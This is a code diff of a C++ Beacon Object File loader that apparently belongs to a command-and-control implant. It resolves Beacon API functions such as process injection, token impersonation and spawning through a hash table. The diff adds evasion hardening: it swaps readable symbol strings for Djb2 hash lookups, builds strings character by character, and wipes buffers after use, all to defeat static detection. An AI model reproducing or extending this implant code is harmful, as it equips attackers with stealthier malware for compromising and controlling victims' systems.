@@ -1,43 +1,88 @@
 #include "Boffer.h"
+#include "ProcLoader.h"
 #include "utils.h"
 
 #if defined(__x86_64__) || defined(_WIN64)
-char IMP_FUNC[] = "__imp_Beacon";
 int IMP_LENGTH = 6;
-int FUNC_LENGTH = 12;
 #else
-char IMP_FUNC[] = "__imp__Beacon";
 int IMP_LENGTH = 7;
-int FUNC_LENGTH = 13;
 #endif
+char IMP_FUNC[] = { '_', '_', 'i', 'm', 'p', '_', '_', 0 };
+
+void InitBofOutputData()
+{
+	if (bofOutputPacker == NULL) {
+		bofOutputPacker = (Packer*)MemAllocLocal(sizeof(Packer));
+		*bofOutputPacker = Packer();
+	}
+}
+
+BOF_API BeaconFunctions[32] = {
+	{ HASH_FUNC_BEACONDATAPARSE,              BeaconDataParse },
+	{ HASH_FUNC_BEACONDATAINT,                BeaconDataInt },
+	{ HASH_FUNC_BEACONDATASHORT,              BeaconDataShort },
+	{ HASH_FUNC_BEACONDATALENGTH,             BeaconDataLength },
+	{ HASH_FUNC_BEACONDATAEXTRACT,            BeaconDataExtract },
+	{ HASH_FUNC_BEACONFORMATALLOC,            BeaconFormatAlloc },
+	{ HASH_FUNC_BEACONFORMATRESET,            BeaconFormatReset },
+	{ HASH_FUNC_BEACONFORMATAPPEND,           BeaconFormatAppend },
+	{ HASH_FUNC_BEACONFORMATPRINTF,           BeaconFormatPrintf },
+	{ HASH_FUNC_BEACONFORMATTOSTRING,         BeaconFormatToString },
+	{ HASH_FUNC_BEACONFORMATFREE,             BeaconFormatFree },
+	{ HASH_FUNC_BEACONFORMATINT,              BeaconFormatInt },
+	{ HASH_FUNC_BEACONOUTPUT,                 BeaconOutput },
+	{ HASH_FUNC_BEACONPRINTF,                 BeaconPrintf },
+	{ HASH_FUNC_BEACONUSETOKEN,               BeaconUseToken },
+	{ HASH_FUNC_BEACONREVERTTOKEN,            BeaconRevertToken },
+	{ HASH_FUNC_BEACONISADMIN,                BeaconIsAdmin },
+	{ HASH_FUNC_BEACONGETSPAWNTO,             BeaconGetSpawnTo },
+	{ HASH_FUNC_BEACONINJECTPROCESS,          BeaconInjectProcess },
+	{ HASH_FUNC_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
+	{ HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess },
+	{ HASH_FUNC_BEACONCLEANUPPROCESS,         BeaconCleanupProcess },
+	{ HASH_FUNC_TOWIDECHAR,					  toWideChar },
+	{ HASH_FUNC_BEACONINFORMATION,            BeaconInformation },
+	{ HASH_FUNC_BEACONADDVALUE,               BeaconAddValue },
+	{ HASH_FUNC_BEACONGETVALUE,               BeaconGetValue },
+	{ HASH_FUNC_BEACONREMOVEVALUE,            BeaconRemoveValue },
+	{ HASH_FUNC_LOADLIBRARYA,                 proxy_LoadLibraryA },
+	{ HASH_FUNC_GETMODULEHANDLEA,             proxy_GetModuleHandleA },
+	{ HASH_FUNC_FREELIBRARY,                  proxy_FreeLibrary },
+	{ HASH_FUNC___C_SPECIFIC_HANDLER,         NULL },
+};
 
 void* FindProcBySymbol(char* symbol)
 {
-	HMODULE hModule = NULL;
-	char* moduleName = NULL;
-	char* funcName = NULL;
-
 	if ( StrLenA(symbol) > IMP_LENGTH) {
-		funcName = symbol + IMP_LENGTH;
-		for (int i = 0; i < BeaconFunctionsCount; i++) {
-			if (BeaconFunctions[i][0] != NULL) {
-				if (StrCmpA(funcName, (char*)BeaconFunctions[i][0]) == 0)
-					return BeaconFunctions[i][1];
+		ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
+		for (int i = 0; i < 32; i++) { // BeaconFunctionsCount
+			if (funcHash == BeaconFunctions[i].hash) {
+				if ( BeaconFunctions[i].proc != NULL ) 
+					return BeaconFunctions[i].proc;
 			}
 		}
-	}
-	if (StrNCmpA(symbol, IMP_FUNC, IMP_LENGTH) == 0) {
+
 		char symbolCopy[1024] = { 0 };
 		memcpy(symbolCopy, symbol, StrLenA(symbol));
 
-		moduleName = symbolCopy + IMP_LENGTH;
-		moduleName = StrTokA(moduleName, (CHAR*)"$");
-		funcName = StrTokA(NULL, (CHAR*)"$");
-		funcName = StrTokA(funcName, (CHAR*)"@");
-		hModule = LoadLibraryA(moduleName);
-		if (hModule)
-			return ApiWin->GetProcAddress(hModule, funcName);
+		CHAR c1[] = { '$',0 };
+		CHAR c2[] = { '@',0 };
+
+		char* moduleName = symbolCopy + IMP_LENGTH;
+		moduleName = StrTokA(moduleName, c1);
+
+		char* funcName = StrTokA(NULL, c1);
+		funcName = StrTokA(funcName, c2);
+
+		funcHash = Djb2A((PUCHAR)funcName);
+		HMODULE hModule = ApiWin->LoadLibraryA(moduleName);
+		
+		memset(symbolCopy, 0, StrLenA(symbol));
+
+		if (hModule) 
+			return GetSymbolAddress(hModule, funcHash);
 	}
+
 	return NULL;
 }
 
